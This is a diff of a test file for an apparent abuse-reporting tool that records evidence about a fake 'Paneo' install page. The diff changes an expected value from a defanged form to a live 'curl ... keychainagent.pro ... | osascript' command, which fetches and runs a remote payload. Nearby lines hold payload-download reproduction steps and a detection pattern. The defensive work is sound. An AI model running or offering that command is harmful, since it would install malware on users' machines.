@@ -71,7 +71,7 @@ describe("provider decision follow-up", () => {
 		expect(evidence.pageContext).toContain("Install Paneo");
 		expect(evidence.pageContext).toContain("2 Run the install command");
 		expect(evidence.dialog).toBe("div.install-modal[role=dialog]");
-		expect(evidence.command?.decoded).toEqual(["curl -sfL hxxps://keychainagent[.]pro/wksxgj/wZZLR9xY29o4 [pipe] osascript -l JavaScript"]);
+		expect(evidence.command?.decoded).toEqual(["curl -sfL https://keychainagent.pro/wksxgj/wZZLR9xY29o4 [pipe] osascript -l JavaScript"]);
 		// The grep prefix encodes the command's fixed start, so it still matches when the payload path rotates.
 		expect(evidence.reproduction[0]).toContain("| grep -o 'Y3VybCAtc2ZMIGh0dHBzOi8v[A-Za-z0-9+/=]*' | base64 -d");
 		expect(evidence.reproduction[1]).toBe(`curl -s -A "curl/8.7.1" -o payload.bin "https://keychainagent.pro/wksxgj/wZZLR9xY29o4" && shasum -a 256 payload.bin`);
@@ -109,7 +109,7 @@ describe("provider decision follow-up", () => {
 		expect(body).toContain("Checked from our server at 2026-11-03T01:00:00.000Z:");
 		expect(body).toContain('- https://keychainagent.pro/wksxgj/wZZLR9xY29o4 requested as a desktop browser (User-Agent "Mozilla/5.0');
 		expect(body).toContain("To reproduce (these only fetch and decode; nothing is run):");
-		expect(body).toContain("The command the page shows (defanged): echo \"hxxps://apps[.]apple[.]com/app/paneo-install\" [then]");
+		expect(body).toContain("The command the page shows (defanged): echo \"https://apps.apple.com/app/paneo-install\" [then]");
 		expect(body).not.toMatch(/\|\s*(?:z|ba)?sh\b/);
 		const events = await AbuseRepository.listEvents(reportId);
 		expect(events.find((event) => event.eventType === "provider_decision.followed_up")?.data).toMatchObject({ state: "denied", detail: "no_abuse_found", narrative: "model" });
